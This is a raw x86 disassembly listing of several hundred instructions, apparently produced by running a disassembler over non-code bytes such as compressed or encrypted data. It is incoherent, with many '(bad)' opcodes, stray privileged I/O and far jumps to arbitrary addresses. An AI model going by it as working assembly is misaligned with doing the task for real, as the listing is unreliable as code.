  411ade:	jmp    0x411b02
  411ae0:	pop    eax
  411ae1:	dec    ebx
  411ae2:	jg     0x411aad
  411ae4:	mov    edi,0x97032680
  411ae9:	test   BYTE PTR [ecx-0x71fbfabb],0xa5
  411af0:	mov    ch,BYTE PTR [eax+eax*2]
  411af3:	jecxz  0x411afe
  411af5:	push   edx
  411af6:	pop    ebx
  411af7:	or     al,0xc9
  411af9:	xor    eax,0xc415bb74
  411afe:	pop    ecx
  411aff:	mov    eax,0xf4b3c56a
  411b04:	cwde   
  411b05:	repnz xchg esi,eax
  411b07:	pop    si
  411b09:	aad    0xd0
  411b0b:	repnz adc BYTE PTR [eax-0x66],al
  411b0f:	call   0x8c10:0x8093070
  411b16:	lods   al,BYTE PTR ds:[esi]
  411b17:	xor    eax,0x1980764d
  411b1c:	loop   0x411b96
  411b1e:	pop    esp
  411b1f:	ret    
  411b20:	sub    eax,0xaa3acd68
  411b25:	mov    DWORD PTR [ebx],esp
  411b27:	sub    ebx,esp
  411b29:	hlt    
  411b2a:	inc    ecx
  411b2b:	mov    ah,0xe9
  411b2d:	cmp    DWORD PTR ds:[edi-0x4f53df02],ebx
  411b34:	xchg   ebp,eax
  411b35:	ins    DWORD PTR es:[edi],dx
  411b36:	add    eax,0x5da879de
  411b3b:	fdiv   DWORD PTR [esi]
  411b3d:	mov    edi,DWORD PTR [edi]
  411b3f:	push   eax
  411b40:	or     eax,0x94e49deb
  411b45:	xor    DWORD PTR [ebp-0x578f1a66],esp
  411b4b:	or     BYTE PTR [edx+0x33b40f66],0xe8
  411b52:	test   al,0xfb
  411b54:	in     al,dx
  411b55:	call   0x4904:0xc59027c7
  411b5c:	iret   
  411b5d:	push   cs
  411b5e:	popf   
  411b5f:	repnz mov eax,0x85006fa2
  411b65:	inc    ebx
  411b66:	and    al,0xf7
  411b68:	cmp    DWORD PTR [esi+0x458aedaa],0x24c3328b
  411b72:	mov    dl,0x7a
  411b74:	sahf   
  411b75:	aas    
  411b76:	popa   
  411b77:	inc    eax
  411b78:	mov    ecx,0xba6cbd8f
  411b7d:	enter  0xbdeb,0x30
  411b81:	bound  esp,QWORD PTR [ecx]
  411b83:	in     al,0x53
  411b85:	loopne 0x411ba7
  411b87:	je     0x411b1a
  411b89:	dec    esp
  411b8a:	xchg   DWORD PTR [edx],ebp
  411b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b8d:	adc    ah,dh
  411b8f:	mov    al,0xaf
  411b91:	push   ebx
  411b92:	xchg   BYTE PTR [ebx],ch
  411b94:	mov    eax,ds:0xe3953df8
  411b99:	(bad)  
  411b9a:	push   edx
  411b9b:	scas   al,BYTE PTR es:[edi]
  411b9c:	(bad)  
  411b9d:	(bad)
  411ba1:	inc    ebp
  411ba2:	imul   edx,esp,0xfddb395b
  411ba8:	into   
  411ba9:	pusha  
  411baa:	push   esp
  411bab:	or     eax,0x214fb3a7
  411bb0:	imul   BYTE PTR [eax-0x61]
  411bb3:	and    al,0x2e
  411bb5:	clc    
  411bb6:	addr16 jb 0x411b70
  411bb9:	xchg   ecx,eax
  411bba:	jb     0x411bc9
  411bbc:	stos   DWORD PTR es:[edi],eax
  411bbd:	inc    edx
  411bbe:	pop    edx
  411bbf:	and    ch,BYTE PTR [ecx]
  411bc1:	mov    cl,0xbf
  411bc3:	pop    ebx
  411bc4:	push   eax
  411bc5:	and    edi,edi
  411bc7:	call   0x31f5be14
  411bcc:	pop    ecx
  411bcd:	mov    eax,0xe7b84ac5
  411bd2:	dec    esi
  411bd3:	inc    edi
  411bd4:	pop    ss
  411bd5:	dec    ebp
  411bd6:	xchg   DWORD PTR [ebx],esp
  411bd8:	push   0xc176ed4b
  411bdd:	mov    bh,0x9a
  411bdf:	jmp    0x69bd:0x5b51ebda
  411be6:	enter  0xc29c,0xfa
  411bea:	rcr    BYTE PTR gs:[esi+0x50],cl
  411bee:	out    dx,eax
  411bef:	lock push edi
  411bf1:	mov    bh,0x8a
  411bf3:	int    0xfa
  411bf5:	push   ecx
  411bf6:	aam    0x40
  411bf8:	add    dh,ch
  411bfa:	adc    eax,ecx
  411bfc:	mov    al,ds:0xcc1cec28
  411c01:	sti    
  411c02:	aam    0x3b
  411c04:	rcl    DWORD PTR [esi-0x63],cl
  411c07:	pop    esi
  411c08:	xchg   ebx,eax
  411c09:	fiadd  DWORD PTR [edx+0x3d]
  411c0c:	sub    edi,DWORD PTR [esi]
  411c0e:	idiv   DWORD PTR [edi-0x6e862ffb]
  411c14:	(bad)  
  411c15:	into   
  411c16:	mov    bh,0x5f
  411c18:	dec    ebx
  411c19:	sub    ebx,DWORD PTR [esp+esi*2+0x39be5a96]
  411c20:	mov    esi,0x8e60feaa
  411c25:	out    0xf8,eax
  411c27:	sub    BYTE PTR [edi],0xe2
  411c2a:	xchg   DWORD PTR [edi-0x9f9ef4a],ecx
  411c30:	push   esp
  411c31:	add    al,0xd6
  411c33:	adc    al,0x52
  411c35:	or     DWORD PTR [esi-0x3b451702],0x24
  411c3c:	repz test eax,0xaa7b9b7d
  411c42:	jns    0x411bd1
  411c44:	out    dx,eax
  411c45:	mov    ebx,0xd19425c4
  411c4a:	mov    ds,WORD PTR [edi-0x3379af8]
  411c50:	adc    DWORD PTR [esp+eiz*8+0x23b447c6],ebp
  411c57:	fwait
  411c58:	pusha  
  411c59:	mov    eax,0xc13f0705
  411c5e:	inc    DWORD PTR [ecx]
  411c60:	mov    bh,0x7e
  411c62:	dec    ecx
  411c63:	scas   al,BYTE PTR es:[edi]
  411c64:	jecxz  0x411c85
  411c66:	out    dx,eax
  411c67:	dec    ebx
  411c68:	dec    ebx
  411c69:	dec    esi
  411c6a:	mov    bh,0x17
  411c6c:	jbe    0x411cd5
  411c6e:	mov    ah,0xbe
  411c70:	pop    eax
  411c71:	add    BYTE PTR [edx+0x3d214925],cl
  411c77:	cmp    DWORD PTR [edi+eax*1+0x15],esp
  411c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c7c:	popa   
  411c7d:	out    dx,eax
  411c7e:	dec    esi
  411c7f:	dec    ecx
  411c80:	mov    bl,cl
  411c82:	push   ds
  411c83:	and    al,0x29
  411c85:	mov    ds:0x710785bd,eax
  411c8a:	jmp    0xd3291514
  411c8f:	pop    eax
  411c90:	adc    dl,dh
  411c92:	dec    edx
  411c93:	push   ds
  411c94:	pop    esi
  411c95:	push   0x9ba9595f
  411c9a:	pop    es
  411c9b:	and    ebx,ebp
  411c9d:	sub    DWORD PTR [edi],edi
  411c9f:	loopne 0x411cf8
  411ca1:	mov    dl,bl
  411ca3:	std    
  411ca4:	xor    BYTE PTR [ebx-0x7d],0x88
  411ca8:	(bad)  
  411caa:	sbb    al,0xa4
  411cac:	inc    ebx
  411cad:	cmp    eax,0xaf9c7c1c
  411cb2:	je     0x411c5d
  411cb4:	dec    DWORD PTR [ebp+eiz*8-0x47]
  411cb8:	xor    DWORD PTR [ebp+ecx*4+0x3be45582],eax
  411cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cc0:	shr    al,0x36
  411cc3:	aad    0x1c
  411cc5:	cmp    cl,BYTE PTR [ecx]
  411cc7:	push   ecx
  411cc8:	sbb    bh,ch
  411cca:	jo     0x411caf
  411ccc:	int3   
  411ccd:	dec    edi
  411cce:	push   edx
  411ccf:	lods   al,BYTE PTR ds:[esi]
  411cd0:	mov    ecx,0x7e095c20
  411cd5:	xor    BYTE PTR cs:[ebx+0x3fea056d],dh
  411cdc:	pop    edi
  411cdd:	xchg   esi,esp
  411cdf:	lea    esp,[ebp-0x2a69fb8]
  411ce5:	out    0x1e,al
  411ce7:	call   0x3f263fb5
  411cec:	dec    esi
  411ced:	pop    eax
  411cee:	or     BYTE PTR [ecx],ch
  411cf0:	push   eax
  411cf1:	shl    BYTE PTR [ebp-0x7d],1
  411cf4:	js     0x411cab
  411cf6:	daa    
  411cf7:	adc    al,BYTE PTR [ebx-0x254a810b]
  411cfd:	les    ebx,FWORD PTR [ebx+0x3c]
  411d00:	pop    esi
  411d01:	jl     0x411d72
  411d03:	sbb    esp,DWORD PTR [edi]
  411d05:	mov    ebx,esi
  411d07:	xchg   BYTE PTR [eax-0x3b],cl
  411d0a:	hlt    
  411d0b:	add    dl,BYTE PTR [ecx+edx*2+0x5f]
  411d0f:	arpl   WORD PTR [ecx+0x41d4b579],bx
  411d15:	xchg   dl,al
  411d17:	mov    ds:0x9c03e26b,eax
  411d1c:	push   esi
  411d1d:	fnstenv [esi-0x1a4501fc]
  411d23:	cmp    al,0x24
  411d25:	sub    edi,ecx
  411d27:	(bad)  
  411d28:	cmp    edi,esp
  411d2a:	arpl   WORD PTR [ebp+0x64350e33],si
  411d30:	in     al,0x93
  411d32:	or     DWORD PTR [ebp-0x563f2418],esp
  411d38:	add    DWORD PTR [edx+0x17f9fa82],ebp
  411d3e:	fidivr WORD PTR [ebp+0x4d5a9f13]
  411d44:	xor    al,BYTE PTR fs:[ebp+0x67ae0ec2]
  411d4b:	lock mov bh,dh
  411d4e:	or     BYTE PTR [edx],0x2b
  411d51:	pop    es
  411d52:	aaa    
  411d53:	fwait
  411d54:	sub    edx,DWORD PTR [edi]
  411d56:	fisttp QWORD PTR [edx+0x5b7219f7]
  411d5c:	cdq    
  411d5d:	loope  0x411dc5
  411d5f:	scas   al,BYTE PTR es:[edi]
  411d60:	mov    ch,0xc7
  411d62:	into   
  411d63:	push   es
  411d64:	int3   
  411d65:	add    BYTE PTR [eax-0x33],bh
  411d68:	sti    
  411d69:	cmp    DWORD PTR [edi+0xe],0xefdd92dc
  411d70:	sub    al,0x76
  411d72:	in     eax,0xcd
  411d74:	inc    ebp
  411d75:	adc    ah,BYTE PTR [ebp+eiz*1-0x6e]
  411d79:	mov    dh,0x3b
  411d7b:	loope  0x411db8
  411d7d:	mov    DWORD PTR [ebp+0xc066bf9],esi
  411d83:	aam    0x5c
  411d85:	jp     0x411d3b
  411d87:	std    
  411d88:	sbb    eax,edi
  411d8a:	cmp    ecx,ecx
  411d8c:	xor    eax,0x52cc4238
  411d91:	cdq    
  411d92:	(bad)  
  411d93:	std    
  411d94:	push   ss
  411d95:	sahf   
  411d96:	mov    edx,0x90b2089a
  411d9b:	nop
  411d9c:	je     0x411d6d
  411d9e:	xchg   edi,eax
  411d9f:	retf   
  411da0:	idiv   BYTE PTR [eax]
  411da2:	cdq    
  411da3:	(bad)  
  411da4:	addr16 mov edx,0xf9944a27
  411daa:	inc    esp
  411dab:	iret   
  411dac:	les    ecx,FWORD PTR [ebp+esi*2+0x21]
  411db0:	add    al,0xa6
  411db2:	add    BYTE PTR [ecx+0x74ee75d9],0x40
  411db9:	inc    edi
  411dba:	test   DWORD PTR [ebx+0x474d5773],esi
  411dc0:	rcl    BYTE PTR [edx+0x41],1
  411dc3:	adc    BYTE PTR [ecx],ah
  411dc5:	cmp    BYTE PTR [eax-0x41],bh
  411dc8:	lea    edx,[esi-0x5808fb92]
  411dce:	pusha  
  411dcf:	dec    ebp
  411dd0:	les    edx,FWORD PTR [ecx-0x42cd2600]
  411dd6:	mul    DWORD PTR ds:0x9d0cbfd7
  411ddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ddd:	dec    edi
  411dde:	pop    edx
  411ddf:	in     al,dx
  411de0:	rsqrtps xmm5,xmm2
  411de3:	push   esp
  411de4:	inc    ebx
  411de5:	jecxz  0x411d8a
  411de7:	adc    edx,DWORD PTR [ecx+edx*4+0x26877284]
  411dee:	sbb    esp,edi
  411df0:	sahf   
  411df1:	jecxz  0x411d8c
  411df3:	or     dl,0x1
  411df6:	cmp    DWORD PTR [ebp-0x2a],0x3e
  411dfa:	mov    eax,0x62005e90
  411dff:	mov    ah,0x89
  411e01:	sub    eax,0x4a60cd0c
  411e06:	out    dx,ax
  411e08:	stos   BYTE PTR es:[edi],al
  411e09:	mov    ebx,0x4c865bf
  411e0e:	adc    ecx,DWORD PTR [ecx*4+0x6500e9ad]
  411e15:	ins    BYTE PTR es:[edi],dx
  411e16:	scas   eax,DWORD PTR es:[edi]
  411e17:	lds    ecx,FWORD PTR [ecx]
  411e19:	mov    ah,0xfc
  411e1b:	sar    BYTE PTR [esi+0x44],cl
  411e1e:	std    
  411e1f:	mov    bl,0xf3
  411e21:	inc    ecx
  411e22:	jg     0x411def
  411e24:	jmp    0x1194:0xe8ee4629
  411e2b:	pop    ebp
  411e2c:	cmp    dh,dh
  411e2e:	popa   
  411e2f:	repnz inc ebx
  411e31:	mov    edi,DWORD PTR [edx+edi*4-0x7cd2e4c2]
  411e38:	div    ebx
  411e3a:	sahf   
  411e3b:	pop    ebp
  411e3c:	mov    eax,0x37867f50
  411e41:	xor    al,0xc3
  411e43:	add    ebp,DWORD PTR [eax+ebp*8]
  411e46:	mov    ecx,0xddaafc40
  411e4b:	mov    DWORD PTR [esp+esi*4-0x76af78b3],esp
  411e52:	jno    0x411e68
  411e54:	sti    
  411e55:	aam    0x81
  411e57:	or     eax,0x12c50b3d
  411e5c:	mov    dl,0x81
  411e5e:	in     eax,dx
  411e5f:	xor    eax,0xa50705e2
  411e64:	out    0xff,al
  411e66:	clc    
  411e67:	xor    eax,0x19ca2cac
  411e6c:	aas    
  411e6d:	loop   0x411e20
  411e6f:	pop    esi
  411e70:	or     eax,0xdd213baf
  411e75:	jo     0x411e18
  411e77:	xchg   esp,eax
  411e78:	das    
  411e79:	leave  
  411e7a:	(bad)  
  411e7b:	xor    al,0xfa
  411e7d:	das    
  411e7e:	sub    eax,0xc879709f
  411e83:	jno    0x411edd
  411e85:	mov    edi,edi
  411e87:	cmp    ch,bl
  411e89:	cmp    bh,BYTE PTR [edx-0x131af2d2]
  411e8f:	ins    DWORD PTR es:[edi],dx
  411e90:	or     eax,DWORD PTR [edi]
  411e92:	stc    
  411e93:	mov    ah,0xd6
  411e95:	or     ebx,edi
  411e97:	icebp  
  411e98:	adc    al,0xba
  411e9a:	stos   DWORD PTR es:[edi],eax
  411e9b:	jl     0x411e5a
  411e9d:	pushf  
  411e9e:	inc    ebp
  411e9f:	mov    al,0xc
  411ea1:	or     al,0x92
  411ea3:	mov    ecx,0x35cf923e
  411ea8:	shl    bh,cl
  411eaa:	(bad)  
  411eab:	jbe    0x411eb4
  411ead:	dec    esi
  411eae:	push   ebp
  411eaf:	mov    cl,0x20
  411eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eb2:	mov    al,dh
  411eb4:	sbb    cl,BYTE PTR [esp+esi*1-0x11a53cd]
  411ebb:	xchg   ebp,edi
  411ebd:	call   0xf6dded93
  411ec2:	sub    al,0x1c
  411ec4:	mov    ds:0x69ea25ee,al
  411ec9:	jmp    0x411e7d
  411ecb:	lock mov esi,0x4fd18639
  411ed1:	lock ins BYTE PTR es:[edi],dx
  411ed3:	cmp    ah,dl
  411ed5:	dec    esp
  411ed6:	mov    bl,0xe6
  411ed8:	push   ebx
  411ed9:	adc    BYTE PTR [esp+esi*4],al
  411edc:	clc    
  411edd:	xchg   ecx,eax
  411ede:	dec    ecx
  411edf:	sub    DWORD PTR [edi+ebp*2+0x22],esi
  411ee3:	out    0x6e,eax
  411ee5:	pushf  
  411ee6:	frstor [eax+0x4e]
  411ee9:	ret    
  411eea:	cmp    esi,DWORD PTR [edi]
  411eec:	xor    BYTE PTR [edi+0x7ccb0cf1],bl
  411ef2:	popa   
  411ef3:	dec    edx
  411ef4:	cdq    
  411ef5:	leave  
  411ef6:	call   FWORD PTR [eax+0x14]
  411ef9:	dec    ebp
  411efa:	mov    al,0xaf
  411efc:	loopne 0x411e99
  411efe:	mov    ch,0x44
  411f00:	out    0xc6,al
  411f02:	add    DWORD PTR [eax],eax
  411f04:	in     al,0x90
  411f06:	mov    edx,0xe8d7092e
  411f0b:	int3   
  411f0c:	fild   DWORD PTR [ecx+0x2172a603]
  411f12:	xor    eax,0x15ba76ee
  411f17:	dec    eax
  411f18:	cmp    bh,0xbc
  411f1b:	add    edx,DWORD PTR [ebx+edi*4+0x43]
  411f1f:	sbb    BYTE PTR [ebx+0x1],0x71
  411f23:	into   
  411f24:	push   esp
  411f25:	adc    BYTE PTR [edi+0x1f46f2f6],bl
  411f2b:	push   ebx
  411f2c:	dec    eax
  411f2e:	mov    WORD PTR [ebx],gs
  411f30:	mov    bl,0x72
  411f32:	dec    esi
  411f33:	stos   DWORD PTR es:[edi],eax
  411f34:	popa   
  411f35:	fiadd  WORD PTR [eax+0x1e]
  411f38:	mov    eax,0x60892ef5
  411f3d:	sub    eax,0x453e5f59
  411f42:	(bad)  
  411f44:	(bad)  
  411f45:	fcom   QWORD PTR [eax+0x76428d74]
  411f4b:	sub    al,0x1c
  411f4d:	call   0xf7fe4e12
  411f52:	cmp    eax,DWORD PTR [edx]
  411f54:	fldcw  WORD PTR gs:[eax-0xe]
  411f58:	ret    0xecec
  411f5b:	repnz adc dh,bl
  411f5e:	jecxz  0x411f0d
  411f60:	dec    esp
  411f61:	mov    ecx,0xcb8a0ad1
  411f66:	pop    DWORD PTR [eax]
  411f68:	push   ebx
  411f69:	adc    dh,BYTE PTR [esi-0x7d5b84ea]
  411f6f:	pop    ds
  411f70:	jno    0x411f5b
  411f72:	jp     0x411fdd
  411f74:	push   ds
  411f75:	test   eax,0x26e39f84
  411f7a:	ja     0x411f1a
  411f7c:	add    DWORD PTR [ebp+0x38],esp
  411f7f:	dec    ecx
  411f80:	adc    DWORD PTR [edx-0x65ab7278],ebx
  411f86:	rcr    DWORD PTR [edx],0xae
  411f89:	adc    eax,DWORD PTR [eax+eiz*1]
  411f8c:	arpl   WORD PTR [edx+eiz*1],cx
  411f8f:	daa    
  411f90:	push   edx
  411f91:	push   ds
  411f92:	cli    
  411f93:	retf   
  411f94:	push   edi
  411f95:	arpl   WORD PTR [ebx+0x44],dx
  411f98:	in     al,dx
  411f99:	push   eax
  411f9a:	stos   BYTE PTR es:[edi],al
  411f9b:	or     cl,dl
  411f9d:	vrsqrtss xmm7,xmm3,DWORD PTR [edx]
  411fa1:	mov    ds:0x8caf905a,eax
  411fa6:	rcl    DWORD PTR [edx],1
  411fa8:	dec    edi
  411fa9:	pushf  
  411faa:	dec    eax
  411fab:	ds sbb al,0xc2
  411fae:	cmp    BYTE PTR [ebp+0x4ca0bf59],ch
  411fb4:	mov    edx,0xa6a50121
  411fb9:	and    ebx,DWORD PTR [esp+esi*8+0x435dc24c]
  411fc0:	pop    esp
  411fc1:	xchg   ebp,eax
  411fc2:	loopne 0x411fe7
  411fc4:	dec    edi
  411fc5:	jmp    0x412040
  411fc7:	mov    edx,0x249287c0
  411fcc:	es push ebx
  411fce:	xlat   BYTE PTR ds:[ebx]
  411fcf:	dec    ebp
  411fd0:	and    BYTE PTR ds:0x94a93681,0x1f
  411fd7:	arpl   sp,sp
  411fd9:	mov    cs,esp
  411fdb:	push   edi
  411fdc:	push   ebp
  411fdd:	jae    0x411f74
  411fdf:	adc    DWORD PTR [esp+esi*2],esi
  411fe2:	xchg   BYTE PTR [ebx-0x659e6a82],cl
  411fe8:	fdivr  st,st(7)
  411fea:	xor    ebp,eax
  411fec:	outs   dx,BYTE PTR ds:[esi]
  411fed:	mov    edx,0x85f26257
  411ff2:	and    dl,BYTE PTR [eax+0x3a467c5c]
  411ff8:	jmp    0x411fa2
  411ffa:	pop    edi
  411ffb:	add    eax,0x1f42ebc9
  412000:	adc    DWORD PTR [esi-0x520747f4],0x6a
  412007:	aam    0x53
  412009:	stos   DWORD PTR es:[edi],eax
  41200a:	adc    DWORD PTR [edx],esp
  41200c:	clc    
  41200d:	(bad)  
  41200f:	dec    edi
  412010:	add    al,0x80
  412012:	xor    BYTE PTR [edi-0x28f230f0],ah
  412018:	adc    dl,BYTE PTR [ebp+0x675dd251]
  41201e:	(bad)  
  41201f:	mov    ds:0x3e8409a3,eax
  412024:	or     DWORD PTR [edi-0x25],ebx
  412027:	xchg   esi,eax
  412028:	repnz nop
  41202a:	adc    cl,bl
  41202c:	hlt    
  41202d:	bswap  esp
  41202f:	xchg   esi,eax
  412030:	mov    ch,0x38
  412032:	aas    
  412033:	(bad)  
  412034:	stc    
  412035:	or     DWORD PTR [ecx],edx
  412037:	retf   0xc0bf
  41203a:	pusha  
  41203b:	jne    0x41202e
  41203d:	ins    BYTE PTR es:[edi],dx
  41203e:	cwde   
  41203f:	sub    al,0xd6
  412041:	sub    eax,0xcb7eecda
  412046:	popa   
  412047:	retf   0xad5a
  41204a:	inc    esi
  41204b:	add    BYTE PTR [ebp+0x2a],bh
  41204e:	jp     0x411ff4
  412050:	sar    BYTE PTR [edx+0x1b5ba9ec],cl
  412056:	not    BYTE PTR [ebx]
  412058:	test   BYTE PTR [esi+0x69],al
  41205b:	outs   dx,BYTE PTR ds:[esi]
  41205c:	(bad)  [ecx+0x56]
  41205f:	jno    0x4120da
  412061:	dec    edx
  412062:	out    0xd5,al
  412064:	mov    eax,0xf6a524c9
  412069:	pop    edx
  41206a:	rcr    BYTE PTR [esi-0x35],cl
  41206d:	adc    al,0x13
  41206f:	or     ch,dl
  412071:	cdq    
  412072:	adc    eax,0x7055823
  412077:	ins    DWORD PTR es:[edi],dx
  412078:	arpl   WORD PTR [edx-0x4b],dx
  41207b:	(bad)  
  41207c:	push   edx
  41207d:	mov    cl,0xb9
  41207f:	rcr    DWORD PTR [ebx-0x28],0xdf
  412083:	nop
  412084:	loop   0x412067
  412086:	inc    ebp
  412087:	push   ds
  412088:	add    eax,0xb15ce2bd
  41208d:	jmp    0x4120cc
  41208f:	adc    DWORD PTR [edx+0xa],0x36d72c95
  412096:	sbb    eax,0x345d63b7
  41209b:	je     0x4120dd
  41209d:	add    al,0xc8
  41209f:	jp     0x4120c6
  4120a1:	stos   DWORD PTR es:[edi],eax
  4120a2:	inc    ebx
  4120a3:	sahf   
  4120a4:	aam    0x12
  4120a6:	inc    ebp
  4120a7:	sub    ah,BYTE PTR [ecx-0x46]
  4120aa:	adc    eax,0xcb6a67dd
  4120af:	rol    DWORD PTR [eax],cl
  4120b1:	outs   dx,BYTE PTR ds:[esi]
  4120b2:	or     al,0x78
  4120b4:	in     eax,dx
  4120b5:	repz call 0x99a3ee6d
  4120bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120bc:	out    dx,al
  4120bd:	cs push edx
  4120bf:	jns    0x412043
  4120c1:	xchg   BYTE PTR [ebx],ch
  4120c3:	mov    bl,0x50
  4120c5:	pop    es
  4120c6:	push   edx
  4120c7:	mov    fs,WORD PTR [ebp+0x10]
  4120ca:	shl    ecx,1
  4120cc:	jb     0x41211a
  4120ce:	pushf  
  4120cf:	xchg   BYTE PTR [edi],ah
  4120d1:	adc    eax,DWORD PTR [ebx+0x73]
  4120d4:	xor    al,0x17
  4120d6:	loope  0x41210e
  4120d8:	fsub   QWORD PTR [ebp+0x7d3778a8]
  4120de:	xor    DWORD PTR [ecx],eax
  4120e0:	cmp    ebp,DWORD PTR [ecx-0x59]
  4120e3:	dec    esi
  4120e4:	mov    ebx,0xb3de5534
  4120e9:	ss push es
  4120eb:	push   ebx
  4120ec:	push   ebp
  4120ed:	push   edx
  4120ee:	mov    dl,0xbf
  4120f0:	jp     0x412074
  4120f2:	lock test eax,0x4e4038c4
  4120f8:	inc    edx
  4120f9:	pop    edx
  4120fa:	and    BYTE PTR [eax-0x25],ah
  4120fd:	adc    al,0xed
  4120ff:	out    dx,eax
  412100:	or     esp,ecx
  412102:	ficomp DWORD PTR [ebp+0x6e542cec]
  412108:	xchg   edi,eax
  412109:	shl    BYTE PTR [esp+eax*8+0x79],0xfc
  41210e:	aaa    
  41210f:	mov    ds,WORD PTR [ebp-0x518280bf]
  412115:	stos   DWORD PTR es:[edi],eax
  412116:	and    al,0x7d
  412118:	enter  0xe244,0x46
  41211c:	add    eax,0x5cc48720
  412121:	dec    edi
  412122:	or     BYTE PTR [ebx],dl
  412124:	mov    dh,0x1b
  412126:	mov    bl,BYTE PTR [edi-0x648c2aa7]
  41212c:	pop    edx
  41212d:	add    eax,0xa9010a01
  412132:	(bad)  
  412133:	nop
  412134:	lds    edi,FWORD PTR [edx-0x50]
  412137:	mov    bl,0x32
  412139:	and    DWORD PTR [eax+esi*4],eax
  41213c:	mov    ds:0xf86acfb8,eax
  412141:	push   ss
  412142:	sahf   
  412143:	cs inc eax
  412145:	dec    esp
  412146:	sahf   
  412147:	lods   al,BYTE PTR ds:[esi]
  412148:	mov    ch,0x75
  41214a:	mov    al,0x61
  41214c:	rcl    DWORD PTR [eax+0x1da799f3],1
  412152:	mov    ebp,0x52636632
  412157:	retf   0x44d4
  41215a:	leave  
  41215b:	hlt    
  41215c:	push   edx
  41215d:	push   esi
  41215e:	dec    ebp
  41215f:	icebp  
  412160:	loop   0x4121c1
  412162:	retf   0xa128
  412165:	div    BYTE PTR [eax-0x575cb06c]
  41216b:	xchg   BYTE PTR [ebp-0x3e1c27c3],dl
  412171:	in     eax,dx
  412172:	sub    al,0xa6
  412174:	scas   eax,DWORD PTR es:[edi]
  412175:	xchg   DWORD PTR [eax+0x46],esi
  412178:	fwait
  412179:	inc    ebp
  41217a:	int3   
  41217b:	jecxz  0x41216b
  41217d:	imul   ebp,DWORD PTR [esi-0x5eaf5fba],0x7ecf4ae4
  412187:	or     ecx,DWORD PTR [ebx+0x4f]
  41218a:	jecxz  0x4121cf
  41218c:	dec    cl
  41218e:	out    dx,al
  41218f:	(bad)  
  412190:	cmp    eax,0x5a8b0d6
  412195:	cmp    DWORD PTR [esi+0x2b],ebx
  412198:	cmp    eax,0x81869d2d
  41219d:	mov    eax,DWORD PTR [edx+0x3b8b7cb7]
  4121a3:	or     DWORD PTR [ecx+0x3a],ebx
  4121a6:	std    
  4121a7:	xchg   eax,esp
  4121a9:	test   ch,cl
  4121ab:	daa    
  4121ac:	ud0    edi,DWORD PTR [eax]
  4121af:	sar    BYTE PTR [eax-0x6653f57f],1
  4121b5:	adc    dl,0xb3
  4121b8:	ins    DWORD PTR es:[edi],dx
  4121b9:	clc    
  4121ba:	(bad)  
  4121bb:	fild   DWORD PTR [eax-0x25eaf3b7]
  4121c1:	mov    al,ds:0xdefd4c7d
  4121c6:	jb     0x4121c9
  4121c8:	std    
  4121c9:	aad    0x52
  4121cb:	sbb    ebp,DWORD PTR [eax]
  4121cd:	push   es
  4121ce:	sets   BYTE PTR [ebx+eiz*8]
  4121d2:	mov    ah,0x54
  4121d4:	jo     0x4121fd
  4121d6:	loope  0x412236
  4121d8:	repnz dec edx
  4121da:	(bad)  
  4121db:	jmp    0xbc02:0x77bf2571
  4121e2:	xor    ecx,0xffffffaf
  4121e5:	mov    ?,WORD PTR [eax+0x6e]
  4121e8:	dec    ebx
  4121e9:	jbe    0x412194
  4121eb:	jae    0x4121f3
  4121ed:	leave  
  4121ee:	push   ecx
  4121ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121f0:	test   DWORD PTR [edx-0x5e],esi
  4121f3:	jp     0x4121cf
  4121f5:	jnp    0x41222d
  4121f7:	sahf   
  4121f8:	test   al,0xba
  4121fa:	sub    al,0x3a
  4121fc:	mov    dl,0x6a
  4121fe:	aas    
  4121ff:	bound  ecx,QWORD PTR [esi-0x52]
  412202:	(bad)  
  412203:	fist   DWORD PTR [esi-0x33]
  412206:	mov    edi,DWORD PTR [esi+0x3a]
  412209:	mov    eax,0xfcdc01fa
  41220e:	add    DWORD PTR [ecx-0x3c3526ef],eax
  412214:	inc    ecx
  412215:	mov    eax,0x7532c06b
  41221a:	and    al,0x76
  41221c:	mov    esi,0x6b048d1b
  412221:	inc    eax
  412222:	popa   
  412223:	push   0xffffffa9
  412225:	enter  0xcbf5,0xcd
  412229:	adc    eax,0x8cd7cb04
  41222e:	or     al,0x39
  412230:	adc    BYTE PTR [ecx-0x44],ch
  412233:	mov    edi,0x59489664
  412238:	sti    
  412239:	push   es
  41223a:	fadd   QWORD PTR [ecx+0x4d]
  41223d:	inc    ecx
  41223e:	mov    esp,0x7a557
  412243:	xor    eax,0xd3488beb
  412248:	sub    DWORD PTR [esi+0x7d0470e5],ebp
  41224e:	mov    al,0x37
  412250:	les    edx,FWORD PTR [edi+0x4eec3cd7]
  412256:	xchg   edi,eax
  412257:	mov    bh,0x7
  412259:	sbb    bl,BYTE PTR [edi+0x62]
  41225c:	push   ebx
  41225d:	gs inc esp
  41225f:	dec    edi
  412260:	sub    al,0x6e
  412262:	mov    edx,es
  412264:	inc    edx
  412265:	fnstenv [edx]
  412267:	das    
  412268:	stos   BYTE PTR es:[edi],al
  412269:	lods   al,BYTE PTR ds:[esi]
  41226a:	sub    al,0xb9
  41226c:	cdq    
  41226d:	mov    eax,0x1c6c8caa
  412272:	push   edx
  412273:	lods   eax,DWORD PTR ds:[esi]
  412274:	pop    ds
  412275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412276:	es jnp 0x4122f1
  412279:	push   esi
  41227a:	xchg   ebp,eax
  41227b:	pop    ecx
  41227c:	mov    WORD PTR [eax+0x1ccbee54],es
  412282:	sbb    DWORD PTR [ebx-0x27],0x85826137
  412289:	or     eax,0x6de46403
  41228e:	jmp    0xda5cb393
  412293:	push   0xf7a9c84a
  412298:	std    
  412299:	repnz push esp
  41229b:	xor    al,0x1d
  41229d:	and    eax,0x21207258
  4122a2:	push   ds
  4122a3:	dec    ebp
  4122a4:	ins    BYTE PTR es:[edi],dx
  4122a5:	and    eax,0xb9c2e3ec
  4122aa:	mov    DWORD PTR [edx+0x66],ebp
  4122ad:	jecxz  0x41230e
  4122af:	pop    ecx
  4122b0:	push   eax
  4122b1:	sub    eax,0xac180da6
  4122b6:	xor    DWORD PTR [edx+0x3fe1059d],edi
